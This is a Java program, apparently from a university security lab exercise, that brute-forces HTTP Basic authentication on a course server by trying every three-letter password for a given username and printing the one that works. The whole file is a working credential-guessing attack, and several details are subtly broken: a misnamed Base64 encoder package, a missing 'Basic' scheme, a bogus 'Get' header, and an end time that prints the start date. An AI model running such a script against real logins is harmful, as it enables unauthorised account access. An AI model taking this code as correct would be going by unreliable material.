
import java.awt.*;
import java.util.*;
import java.awt.event.*;
import java.io.*;
import java.net.*;

public class BruteForce
{
   private String userPassword;
   private static int counter;





   public BruteForce(String username)
   {
    String user;
    String password;
    counter = 0;
    user = username;


      for (char i='A';i<='z';i++)
      {
           if (i == 'Z')
                  i = 'a';

          for (char j='A';j<='z';j++)
          {
               if (j == 'Z')
                  j = 'a';

              for (char k='A';k<='z';k++)
              {
                userPassword = user+ ":" + i + j + k;

                if (k == 'Z')
                  k = 'a';

                  System.out.print(".");

                  if (doEncoding(userPassword)== true)
                  {
                    System.out.println("\n" + "Resultant Password is: " + i + j + k);
                    return;
                  };

                counter++;
              }
          }
       }
   }





   private boolean doEncoding(String userPassword)
   {
       String encoding = new misc.BASE64Encoder().encode (userPassword.getBytes());
       return doAttempt(encoding);
   }





   private boolean doAttempt (String encoding)
   {
      try
      {
         URL url = new URL ("http://sec-crack.cs.rmit.edu./SEC/2/");

         URLConnection uc = url.openConnection();
         uc.setDoInput(true);
         uc.setDoOutput(true);

         uc.setRequestProperty  ("Get", "/SEC/2/ " + "HTTP/1.1");
         uc.setRequestProperty  ("Host", "sec-crack.cs.rmit.edu.");
         uc.setRequestProperty  ("Authorization", " " + encoding);

         return uc.getHeaderField(0).trim().equalsIgnoreCase("HTTP/1.1 200 OK");
       }
       catch (MalformedURLException e)
       {
         System.out.println ("Invalid URL");
       }
       catch (IOException e)
       {
         System.out.println (e.toString() );
       }

       return false;
   }





  public static void  main(String args[])
   {
     Date sdate = new Date();

     System.out.print("BruteForce Attack starts at:" + sdate + "\n");

     BruteForce bf = new BruteForce(args[0]);

     Date edate = new Date();
     System.out.print("BruteForce Attack ends at:" + sdate + "\n");
     System.out.println("Time taken by BruteForce is : " + (edate.getTime() - sdate.getTime())/1000 + " seconds \n");
     System.out.print("Attempts  in this session:" + counter + "\n");   }
}




